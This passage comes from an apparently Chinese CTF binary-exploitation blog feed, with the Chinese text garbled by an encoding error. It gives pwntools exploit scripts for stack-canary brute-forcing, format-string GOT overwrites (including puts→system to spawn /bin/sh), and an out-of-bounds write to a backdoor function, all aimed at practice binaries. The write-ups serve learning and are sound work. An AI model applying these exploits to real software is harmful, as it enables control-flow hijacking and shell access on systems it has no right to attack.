src="/2023/04/12/canary-jie-ti-pian/2-4.png"></p><h1 id="bin1"><a href="#bin1" class="headerlink" title="bin1"></a>bin1</h1><p>çŸ¥è¯†ç‚¹ï¼š</p><ul><li>forkå¾ªç¯åˆ›å»ºå­è¿›ç¨‹ï¼Œcanaryå€¼ç›¸åŒ</li><li>çˆ†ç ´canary</li></ul><p>ç¨‹åºå¼€å¯Canaryå’ŒNXä¿æŠ¤ï¼šæ²¡å•¥å¥½è¯´çš„ï¼Œè·Ÿä¹‹å‰CanaryåŸç†ç¯‡ä¾‹å­ä¸€æ¨¡ä¸€æ ·</p><p><img src="/2023/04/12/canary-jie-ti-pian/3-0.png"></p><p><img src="/2023/04/12/canary-jie-ti-pian/3-1.png"></p><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./bin1"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./bin1"</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span> <span class="token string">"Checking %d for %d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> k<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> canary <span class="token operator">+</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'welcome\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>res <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"sucess"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>canary <span class="token operator">+=</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token keyword">print</span> <span class="token string">'canary: %s'</span> <span class="token operator">%</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getflag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/12/canary-jie-ti-pian/3-2.png"></p><h1 id="bin3"><a href="#bin3" class="headerlink" title="bin3"></a>bin3</h1><p>çŸ¥è¯†ç‚¹ï¼š</p><ul><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²å°†__stack_chk_failçš„gotè¡¨é¡¹å†…å®¹ä¿®æ”¹ä¸ºåé—¨å‡½æ•°</li></ul><p>ç¨‹åºå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæœ‰åé—¨å‡½æ•°ï¼Œä¸”åªæœ‰ä¸€æ¬¡è¾“å…¥è¾“å‡ºæœºä¼šã€‚</p><p>æ¼æ´åˆ©ç”¨ï¼š</p><ul><li>read_nåªèƒ½è¯»å…¥0x59ä¸ªå­—ç¬¦ï¼Œåˆšå¥½æº¢å‡ºåˆ°canary</li><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬6ä¸ªå‚æ•°</li></ul><p><img src="/2023/04/12/canary-jie-ti-pian/4-0.png"></p><p>expï¼šï¼ˆè¿™é‡Œæˆ‘ç”¨fmtstr_payloadä¸€ç›´æ‰“ä¸é€š&gt;_&lt;ï¼Œæ‰€ä»¥è‡ªå·±æ‰‹åŠ¨æ„é€ å§</p><blockquote><p>è¿™é‡Œæˆ‘ä»¬åªéœ€è¦è¦†ç›–ä½ä¸¤ä¸ªå­—èŠ‚å°±è¡Œï¼Œé«˜å­—èŠ‚æ˜¯ç›¸ç­‰çš„</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level='debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bin3'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bin3'</span><span class="token punctuation">)</span>stack_fail <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span><span class="token comment">#AAAAA%xx ==&gt; ç¬¬6ä¸ªå‚æ•°</span><span class="token comment">#xxc%8$hn ==&gt; ç¬¬7ä¸ªå‚æ•°</span><span class="token comment">#p64(stack_fail) ==&gt; ç¬¬8ä¸ªå‚æ•°</span>payload <span class="token operator">=</span> <span class="token string">'AAAAA'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'backdoor'</span><span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xFFFF</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c'</span> <span class="token operator">+</span> <span class="token string">'%8$hn'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_fail<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/12/canary-jie-ti-pian/4-1.png"></p><h1 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h1><p>çŸ¥è¯†ç‚¹ï¼š</p><ul><li>æ•°ç»„ä¸‹æ ‡è¶Šç•Œ(æ£€æŸ¥ä¸ä¸¥æ ¼)é€ æˆâ€œä»»æ„åœ°å€â€å†™</li></ul><p>ç¨‹åºå¼€å¯äº†Canaryå’ŒNXä¿æŠ¤ï¼Œå­˜åœ¨å¦‚ä¸‹æ¼æ´ï¼š</p><ul><li>å­˜åœ¨åé—¨å‡½æ•°ï¼Œæ•°ç»„ä¸‹æ ‡æ£€æŸ¥ä¸ä¸¥æ ¼</li></ul><p>æ¼æ´åˆ©ç”¨ï¼š</p><ul><li>è®¡ç®—å‡ºret_addrç›¸å¯¹äºæ•°ç»„çš„ä¸‹æ ‡ï¼ˆ14ï¼‰ï¼Œç„¶åç›´æ¥æŠŠåé—¨å‡½æ•°å†™å…¥</li></ul><p><img src="/2023/04/12/canary-jie-ti-pian/6.png"></p><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./homework'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./homework'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name? '</span><span class="token punctuation">,</span> <span class="token string">'XiaozaYa'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'dump'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">' &gt; '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'edit: '</span><span class="token punctuation">,</span> <span class="token string">'14'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'many? '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'call_me_maybe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'dump'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">' &gt; '</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/12/canary-jie-ti-pian/6-1.png"></p><blockquote><p>è¿™ä¸ªé¢˜åœ¨è¾“å…¥nameçš„æ—¶å€™å…¶å®æœ‰ä¸€ä¸ªbssæº¢å‡ºæ¼æ´</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Canaryè§£é¢˜ç¯‡ç«  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>partial overwrite</title>
      <link href="/2023/04/11/partial-overwrite/"/>
      <url>/2023/04/11/partial-overwrite/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>partial overwrite è¿™ç§æŠ€å·§åœ¨å¾ˆå¤šåœ°æ–¹éƒ½é€‚ç”¨, è¿™é‡Œæ˜¯æ ˆä¸Šçš„ partial overwrite ã€‚</p><p>æˆ‘ä»¬çŸ¥é“, åœ¨å¼€å¯äº†éšæœºåŒ–ï¼ˆASLRï¼ŒPIEï¼‰å, <strong>æ— è®ºé«˜ä½çš„åœ°å€å¦‚ä½•å˜åŒ–ï¼Œä½ 12 ä½çš„é¡µå†…åç§»å§‹ç»ˆæ˜¯å›ºå®šçš„</strong>, ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬èƒ½æ›´æ”¹ä½ä½çš„åç§», å°±å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµ, ç»•è¿‡ PIE ä¿æŠ¤ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PIEç»•è¿‡ </tag>
            
            <tag> åœ°å€éšæœºåŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ˆåŠ«æŒ</title>
      <link href="/2023/04/11/zhan-jie-chi/"/>
      <url>/2023/04/11/zhan-jie-chi/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ˆè¿ç§» </tag>
            
            <tag> stack pivoting </tag>
            
            <tag> frame faking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¾‹é¢˜</title>
      <link href="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/"/>
      <url>/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="64-ä½ç¨‹åºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#64-ä½ç¨‹åºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="64 ä½ç¨‹åºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>64 ä½ç¨‹åºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2><p>64ä½ä¸32 ä½åŒºåˆ«ï¼š<strong>64 ä½å‡½æ•°çš„å‰ 6 ä¸ªå‚æ•°æ˜¯å­˜å‚¨åœ¨ç›¸åº”çš„å¯„å­˜å™¨ä¸­çš„</strong>ã€‚é‚£ä¹ˆåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¸­ï¼Œè™½ç„¶æˆ‘ä»¬å¹¶æ²¡æœ‰å‘ç›¸åº”å¯„å­˜å™¨ä¸­æ”¾å…¥æ•°æ®ï¼Œä½†æ˜¯ç¨‹åºä¾æ—§ä¼šæŒ‰ç…§æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç›¸åº”æ ¼å¼å¯¹å…¶è¿›è¡Œè§£æã€‚</p><h3 id="2017-UIUCTF-pwn200-GoodLuck"><a href="#2017-UIUCTF-pwn200-GoodLuck" class="headerlink" title="2017-UIUCTF-pwn200-GoodLuck"></a>2017-UIUCTF-pwn200-GoodLuck</h3><p>64ä½å°ç«¯åºï¼Œå¼€å¯äº†Canaryå’ŒNX</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/1-1.png"></p><p>ç¨‹åºé€»è¾‘å¦‚ä¸‹ï¼š</p><ul><li>flagã€flag_éƒ½æ˜¯å±€éƒ¨å˜é‡ï¼Œæ˜¯ä¿å­˜åœ¨æ ˆä¸­çš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°†flagç»™æ‰“å°å‡ºæ¥</li></ul><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/1-2.png"></p><p>å¯ä»¥ä½¿ç”¨fmtargå·¥å…·ç®—å‡ºflagæ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»ä¸ºï¼š9ï¼Œæ‰€ä»¥ç›´æ¥%9$så³å¯</p><ul><li>ä½¿ç”¨å·¥å…·æ—¶æ³¨æ„ï¼šæˆ‘ä»¬å¿…é¡» break åœ¨ printf å¤„ã€‚</li></ul><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/1-3.png"></p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/1-4.png"></p><h2 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h2><p>wiki:ï¼‰åœ¨ç›®å‰çš„ C ç¨‹åºä¸­ï¼Œlibc ä¸­çš„å‡½æ•°éƒ½æ˜¯é€šè¿‡ GOT è¡¨æ¥è·³è½¬çš„ã€‚æ­¤å¤–ï¼Œåœ¨æ²¡æœ‰å®Œå…¨å¼€å¯ RELRO ä¿æŠ¤çš„å‰æä¸‹ï¼Œæ¯ä¸ª libc çš„å‡½æ•°å¯¹åº”çš„ GOT è¡¨é¡¹æ˜¯å¯ä»¥è¢«ä¿®æ”¹çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŸä¸ª libc å‡½æ•°çš„ GOT è¡¨å†…å®¹ä¸ºå¦ä¸€ä¸ª libc å‡½æ•°çš„åœ°å€æ¥å®ç°å¯¹ç¨‹åºçš„æ§åˆ¶ã€‚æ¯”å¦‚è¯´æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ printf çš„ got è¡¨é¡¹å†…å®¹ä¸º system å‡½æ•°çš„åœ°å€ã€‚ä»è€Œï¼Œç¨‹åºåœ¨æ‰§è¡Œ printf çš„æ—¶å€™å®é™…æ‰§è¡Œçš„æ˜¯ system å‡½æ•°ã€‚</p><p>å‡è®¾æˆ‘ä»¬<strong>å°†å‡½æ•° A çš„åœ°å€è¦†ç›–ä¸ºå‡½æ•° B çš„åœ°å€</strong>ï¼Œé‚£ä¹ˆè¿™ä¸€æ”»å‡»æŠ€å·§å¯ä»¥åˆ†ä¸ºä»¥ä¸‹æ­¥éª¤ï¼š</p><ul><li><p>ç¡®å®šå‡½æ•° A çš„ GOT è¡¨åœ°å€ã€‚</p><ul><li>è¿™ä¸€æ­¥æˆ‘ä»¬åˆ©ç”¨çš„å‡½æ•° A ä¸€èˆ¬åœ¨ç¨‹åºä¸­å·²æœ‰ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨ç®€å•çš„å¯»æ‰¾åœ°å€çš„æ–¹æ³•æ¥æ‰¾ã€‚</li></ul></li><li><p>ç¡®å®šå‡½æ•° B çš„å†…å­˜åœ°å€</p><ul><li>è¿™ä¸€æ­¥é€šå¸¸æ¥è¯´ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±æƒ³åŠæ³•æ¥æ³„éœ²å¯¹åº”å‡½æ•° B çš„åœ°å€ã€‚</li></ul></li><li><p>å°†å‡½æ•° B çš„å†…å­˜åœ°å€å†™å…¥åˆ°å‡½æ•° A çš„ GOT è¡¨åœ°å€å¤„ã€‚</p><ul><li><p>è¿™ä¸€æ­¥ä¸€èˆ¬æ¥è¯´éœ€è¦æˆ‘ä»¬åˆ©ç”¨å‡½æ•°çš„æ¼æ´æ¥è¿›è¡Œè§¦å‘ã€‚ä¸€èˆ¬åˆ©ç”¨æ–¹æ³•æœ‰å¦‚ä¸‹ä¸¤ç§</p><ul><li>å†™å…¥å‡½æ•°ï¼šwrite å‡½æ•°ã€‚</li><li>ROP</li></ul><pre class="line-numbers language-none"><code class="language-none">pop eax; ret;           # printf@got -&gt; eaxpop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebxadd [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„åœ°å€å†™</li></ul></li></ul></li></ul><h3 id="2016-CCTF-pwn3"><a href="#2016-CCTF-pwn3" class="headerlink" title="2016-CCTF-pwn3"></a>2016-CCTF-pwn3</h3><p>32ä½å°ç«¯åºï¼Œåªå¼€äº†NXä¿æŠ¤</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/2-1.png"></p><p>ç¨‹åºå…³é”®è¯´æ˜ï¼š</p><ul><li>ç¨‹åºæœ‰putï¼Œgetï¼Œshowä¸‰ä¸ªåŠŸèƒ½<ul><li>putï¼šä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åŒ…æ‹¬nameå’Œcontent</li><li>getï¼šè¾“å‡ºæŒ‡å®šnameæ–‡ä»¶çš„content</li><li>showï¼šæŠŠæ‰€æœ‰æ–‡ä»¶çš„åå­—æ‹¼æ¥èµ·æ¥ç„¶åputså‡ºæ¥ï¼ˆåä¸Šä¼ çš„æ–‡ä»¶åå­—åœ¨å‰é¢</li></ul></li></ul><p>æ–‡ä»¶åœ¨å†…å­˜ä¸­ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/2-3.png"></p><p>æ¼æ´ç‚¹ï¼š</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/2-2.png"></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°getè¾“å‡ºæ–‡ä»¶å†…å®¹æ—¶ï¼Œç›´æ¥printf(dest)ï¼›</p><p>åˆ©ç”¨æ–¹æ³•ï¼š</p><ul><li>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä»»æ„è¯»æ‰“å°å‡ºputså‡½æ•°çœŸå®åœ°å€ï¼Œä»è€Œè®¡ç®—å‡ºlibc_base</li><li>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä»»æ„å†™æŠŠputså‡½æ•°çš„gotè¡¨é¡¹å†…å®¹æ”¹å†™ä¸ºsystemå‡½æ•°çš„åœ°å€</li><li>ç„¶åæ‰§è¡Œputs(â€˜/bin/sh;â€™) ==&gt; system(â€˜/bin/sh;â€™) <ul><li>è¿™é‡ŒæŠŠæ–‡ä»¶åè®¾ç½®ä¸º<code>/bin/sh;</code>ç„¶åè°ƒç”¨showå°±è¡Œï¼Œè¿™é‡ŒåŠ <code>;</code>æ˜¯å› ä¸ºshowä¼šæŠŠæ‰€æœ‰çš„æ–‡ä»¶åè¿èµ·æ¥ç„¶åè¾“å‡ºï¼Œ<code>;</code>å¯ä»¥é€ æˆæˆªæ–­</li><li>ä¹Ÿå¯ä»¥æŠŠç¬¬ä¸€ä¸ªæ–‡ä»¶åè®¾ç½®ä¸º<code>h</code>,æŠŠç¬¬äºŒä¸ªæ–‡ä»¶åè®¾ç½®ä¸º<code>/bin/s</code>ï¼Œè¿™æ ·æœ€ååˆèµ·æ¥å°±æ˜¯<code>/bin/sh</code>ï¼ˆäº²æµ‹å¯è¡Œ</li></ul></li></ul><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn3"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn3"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>s <span class="token operator">=</span> <span class="token string">'sysbdmin'</span>p <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>p <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span> pio<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ftp&gt;'</span><span class="token punctuation">,</span> <span class="token string">'get'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'get:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">return</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">put</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ftp&gt;'</span><span class="token punctuation">,</span> <span class="token string">'put'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'upload:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ftp&gt;'</span><span class="token punctuation">,</span> <span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token comment">#rxraclhm</span>name<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%7$s'</span>put<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>get<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>system <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token comment">#fmtstr_payload(offset, {addr:value})</span><span class="token comment">#æŠŠaddrå¤„çš„å€¼ä¿®æ”¹ä¸ºvalue,offsetä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>system<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span> payloadput<span class="token punctuation">(</span><span class="token string">'/bin/sh;'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>get<span class="token punctuation">(</span><span class="token string">'/bin/sh;'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/2-4.png"></p><h2 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h2><h3 id="ä¸‰ä¸ªç™½å¸½-pwnme-k0-e"><a href="#ä¸‰ä¸ªç™½å¸½-pwnme-k0-e" class="headerlink" title="ä¸‰ä¸ªç™½å¸½ - pwnme_k0 e"></a>ä¸‰ä¸ªç™½å¸½ - pwnme_k0 e</h3><p>ç¨‹åºRELROä¿æŠ¤å…¨å¼€ï¼ˆæ— æ³•æ‰“gotï¼Œå¼€å¯äº†NX</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-1.png"></p><p>ç¨‹åºåŠŸèƒ½ï¼š</p><ul><li>æœ€å¼€å§‹ï¼Œæ³¨å†Œè´¦å·ï¼Œå¯†ç </li><li>é€‰é¡¹1ï¼šè¾“å‡ºè´¦å·ï¼Œå¯†ç  â€“ show</li><li>é€‰é¡¹2ï¼šä¿®æ”¹è´¦å·ï¼Œå¯†ç  â€“ edit</li></ul><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-2.png"></p><p>æ¼æ´ç‚¹ï¼š</p><ul><li>è¾“å‡ºè´¦å·ï¼Œå¯†ç æ—¶å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´<ul><li>ç¬¬ä¸€ä¸ªprintfè¾“å‡ºè´¦å·</li><li>ç¬¬äºŒä¸ªprintfè¾“å‡ºå¯†ç </li></ul></li></ul><p><img 